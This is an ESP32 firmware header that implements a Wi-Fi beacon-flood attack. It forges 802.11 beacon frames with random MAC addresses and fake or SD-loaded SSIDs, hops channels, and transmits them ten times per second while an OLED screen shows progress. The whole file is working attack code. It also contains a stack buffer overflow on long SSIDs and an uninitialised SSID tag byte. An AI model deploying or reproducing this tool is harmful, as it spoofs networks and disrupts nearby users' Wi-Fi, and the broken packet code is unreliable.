#pragma once

#include "globals.h"
#include <WiFi.h>
#include "esp_wifi.h"

static bool wifiAttackActive = false;
static uint32_t lastBeaconMs = 0;
static uint8_t beaconCount = 0;

// Base 802.11 Beacon frame
static uint8_t beacon_frame[] = {
  0x80, 0x00, 0x00, 0x00, 
  /*4*/  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
  /*10*/ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC (Randomized)
  /*16*/ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (Randomized)
  /*22*/ 0x00, 0x00, // Sequence Number
  /*24*/ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
  /*32*/ 0x64, 0x00, // Beacon Interval
  /*34*/ 0x11, 0x04, // Capabilities
  /*36*/ 0x00, 0x00 // SSID Parameter Set (Length will replace 0x00)
};

static const char* fake_ssids[] = {
  "ERROR_404_NETWORK_NOT_FOUND",
  "FBI_SURVEILLANCE_VAN_4",
  "FREE_WIFI_5G",
  "VIRUS_DOWNLOADING...",
  "OTOM_SECURITY_TEST",
  "CONNECT_FOR_FREE_VIRUS",
  "NSA_LISTENING_POST"
};

static String dynamic_ssids[20];
static int dynamic_ssid_count = 0;

static void startWifiAttack() {
  if (!wifiAttackActive) {
    // Attempt to load from SD
    dynamic_ssid_count = 0;
    if (sdReady) {
      File f = SD.open("/ssids.txt");
      if (f) {
        while (f.available() && dynamic_ssid_count < 20) {
          String s = f.readStringUntil('\n');
          s.trim();
          if (s.length() > 0) {
            dynamic_ssids[dynamic_ssid_count++] = s;
          }
        }
        f.close();
      }
    }
    
    // Fallback to defaults
    if (dynamic_ssid_count == 0) {
      for (int i=0; i<7; i++) dynamic_ssids[i] = fake_ssids[i];
      dynamic_ssid_count = 7;
    }

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    wifiAttackActive = true;
    logEvent("Beacon Spam started");
  } else {
    esp_wifi_set_promiscuous(false);
    wifiAttackActive = false;
    logEvent("Beacon Spam stopped");
  }
}

static void wifiAttackStep() {
  if (!wifiAttackActive) return;
  uint32_t now = millis();
  if (now - lastBeaconMs < 100) return; // Send 10 beacons per second
  lastBeaconMs = now;
  
  // Create a randomized MAC
  for (int i=0; i<6; i++) {
    beacon_frame[10+i] = random(256);
    beacon_frame[16+i] = beacon_frame[10+i]; // Match Source and BSSID
  }
  beacon_frame[10] &= 0xFE; // Ensure unicast MAC

  String current_ssid = dynamic_ssids[random(dynamic_ssid_count)];
  int ssid_len = current_ssid.length();
  
  uint8_t packet[128];
  memcpy(packet, beacon_frame, 36);
  packet[37] = ssid_len;
  
  for(int i = 0; i < ssid_len; i++){
    packet[38 + i] = current_ssid[i];
  }
  
  // Supported rates (1, 2, 5.5, 11 Mbps)
  uint8_t rates[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c };
  memcpy(&packet[38 + ssid_len], rates, 10);
  
  int packetSize = 38 + ssid_len + 10;
  
  esp_wifi_set_channel(random(1, 12), WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_STA, packet, packetSize, true);
  
  beaconCount++;
  
  display.clearDisplay();
  drawHeader("Wi-Fi Beacon Flood");
  display.setTextColor(1);
  display.setCursor(0, 20); display.print("Status: TRANSMITTING...");
  display.setCursor(0, 30); display.print("Sent: "); display.print(beaconCount * 10);
  display.setCursor(0, 40); display.print("Last: "); display.print(current_ssid);
  display.setCursor(0, 56); display.print("Enter=Stop");
  display.display();
}
